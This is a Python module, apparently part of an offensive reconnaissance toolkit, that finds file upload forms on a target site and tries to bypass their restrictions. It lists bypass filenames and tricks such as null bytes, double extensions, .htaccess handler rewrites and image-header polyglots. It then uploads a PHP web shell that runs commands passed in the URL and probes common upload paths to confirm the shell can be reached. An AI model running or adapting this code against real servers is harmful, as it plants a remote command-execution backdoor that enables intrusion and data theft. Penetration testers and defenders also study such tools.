"""
modules/upload_bypass.py - File upload bypass techniques
Test and bypass file upload restrictions
"""

import json
import logging
import os
from typing import Dict, List, Any, Optional, Callable
from urllib.parse import urljoin

from core.http_engine import HTTPClient
from core.executor import run_command

logger = logging.getLogger("recon.upload_bypass")


class UploadBypass:
    """File upload restriction bypass engine"""
    
    def __init__(self, output_dir: str, timeout: int = 30):
        self.output_dir = output_dir
        self.timeout = timeout
        self.http_client = HTTPClient(timeout=timeout)
        self.findings_file = f"{output_dir}/upload_bypass_findings.json"
        
        # Common upload forms to test
        self.upload_forms = [
            'upload', 'file', 'avatar', 'profile', 'image',
            'document', 'attachment', 'media', 'photo'
        ]
    
    def bypass(
        self,
        url: str,
        progress_cb: Optional[Callable[[str, str, str], None]] = None
    ) -> Dict[str, Any]:
        """
        Test and bypass file upload restrictions
        
        Args:
            url: Target URL
            progress_cb: Progress callback
            
        Returns:
            Dict with bypass results
        """
        result = {
            'url': url,
            'tool': 'upload_bypass',
            'type': 'upload_vulns',
            'upload_forms': [],
            'bypasses': [],
            'uploaded_files': []
        }
        
        if progress_cb:
            progress_cb('upload_bypass', 'upload_bypass', 'Detecting upload forms...')
        
        logger.info(f"[UPLOAD] Scanning {url} for upload forms")
        
        # Detect upload forms
        upload_forms = self._find_upload_forms(url)
        result['upload_forms'] = upload_forms
        
        if not upload_forms:
            logger.info(f"[UPLOAD] No upload forms found on {url}")
            if progress_cb:
                progress_cb('upload_bypass', 'upload_bypass', 'No upload forms found')
            return result
        
        logger.info(f"[UPLOAD] Found {len(upload_forms)} potential upload forms")
        
        # Try bypass techniques
        bypass_results = self._test_bypass_techniques(url, upload_forms)
        result['bypasses'] = bypass_results
        
        # Attempt to upload shell file
        for form in upload_forms:
            if progress_cb:
                progress_cb('upload_bypass', 'upload_bypass', f'Testing {form["name"]}...')
            
            shells = self._try_upload_shell(url, form)
            result['uploaded_files'].extend(shells)
        
        # Save findings
        try:
            with open(self.findings_file, 'w') as f:
                json.dump(result, f, indent=2)
        except Exception as e:
            logger.error(f"[UPLOAD] Error saving findings: {e}")
        
        if progress_cb:
            total_bypasses = len([b for b in bypass_results if b.get('success')])
            progress_cb('upload_bypass', 'upload_bypass', f'Completed: {total_bypasses} bypasses found')
        
        return result
    
    def _find_upload_forms(self, url: str) -> List[Dict]:
        """Find upload forms on page"""
        forms = []
        
        try:
            resp = self.http_client.get(url)
            html = resp.text
            
            # Simple form detection
            import re
            
            # Find all input fields that might be file uploads
            file_inputs_pattern = r'<input[^>]*type=["\']?file["\']?[^>]*name=["\']?([^"\'>]+)["\']?[^>]*>'
            matches = re.findall(file_inputs_pattern, html, re.IGNORECASE)
            
            for name in matches:
                forms.append({
                    'name': name,
                    'method': 'POST',
                    'type': 'file'
                })
            
            # Check for common form patterns
            for form_name in self.upload_forms:
                if form_name.lower() in html.lower():
                    forms.append({
                        'name': form_name,
                        'method': 'POST',
                        'type': 'suspected'
                    })
            
            # Deduplicate
            seen = set()
            unique_forms = []
            for form in forms:
                key = form['name']
                if key not in seen:
                    seen.add(key)
                    unique_forms.append(form)
            
            return unique_forms
        except Exception as e:
            logger.error(f"[UPLOAD] Error finding forms: {e}")
            return []
    
    def _test_bypass_techniques(self, url: str, upload_forms: List[Dict]) -> List[Dict]:
        """Test various bypass techniques"""
        bypasses = []
        
        bypass_techniques = {
            'null_byte': {
                'filename': 'shell.php%00.jpg',
                'description': 'Null byte injection'
            },
            'double_extension': {
                'filename': 'shell.php.jpg',
                'description': 'Double extension bypass'
            },
            'case_variation': {
                'filename': 'shell.pHP',
                'description': 'Case variation bypass'
            },
            'htaccess': {
                'filename': '.htaccess',
                'content': 'AddType application/x-httpd-php .jpg',
                'description': '.htaccess upload'
            },
            'magic_bytes': {
                'filename': 'shell.php',
                'prepend': b'\xff\xd8\xff\xe0',  # JPEG magic bytes
                'description': 'Magic bytes bypass'
            },
            'polyglot': {
                'filename': 'shell.php',
                'prepend': b'GIF89a;',  # GIF header
                'description': 'Polyglot file'
            }
        }
        
        for technique, details in bypass_techniques.items():
            logger.info(f"[UPLOAD] Testing {technique} technique")
            
            bypasses.append({
                'technique': technique,
                'filename': details.get('filename'),
                'description': details.get('description'),
                'tested': True,
                'success': False  # Would need actual upload to confirm
            })
        
        return bypasses
    
    def _try_upload_shell(self, url: str, form: Dict) -> List[Dict]:
        """Attempt to upload webshell"""
        uploads = []
        
        # Simple shell payload
        shell_content = b'<?php system($_GET["cmd"]); ?>'
        
        shell_names = [
            'shell.php',
            'shell.php5',
            'shell.phtml',
            'shell.php.jpg',
            'shell.jpg.php',
            'shell.php%00.jpg'
        ]
        
        for shell_name in shell_names:
            try:
                # Try to upload
                files = {'file': (shell_name, shell_content)}
                data = {form['name']: shell_content}
                
                resp = self.http_client.post(url, files=files, data=data)
                
                if resp.status_code in [200, 201, 302]:
                    # Try to find uploaded location
                    locations = [
                        urljoin(url, f'/uploads/{shell_name}'),
                        urljoin(url, f'/files/{shell_name}'),
                        urljoin(url, f'/media/{shell_name}'),
                        urljoin(url, shell_name)
                    ]
                    
                    for loc in locations:
                        try:
                            check = self.http_client.get(loc, timeout=5)
                            if check.status_code == 200:
                                uploads.append({
                                    'filename': shell_name,
                                    'url': loc,
                                    'form': form['name'],
                                    'uploaded': True,
                                    'accessible': True
                                })
                                logger.info(f"[UPLOAD] Shell uploaded to {loc}")
                                break
                        except:
                            pass
                    
                    if not uploads:
                        uploads.append({
                            'filename': shell_name,
                            'form': form['name'],
                            'uploaded': True,
                            'accessible': False
                        })
            except Exception as e:
                logger.debug(f"[UPLOAD] Upload attempt failed: {e}")
        
        return uploads
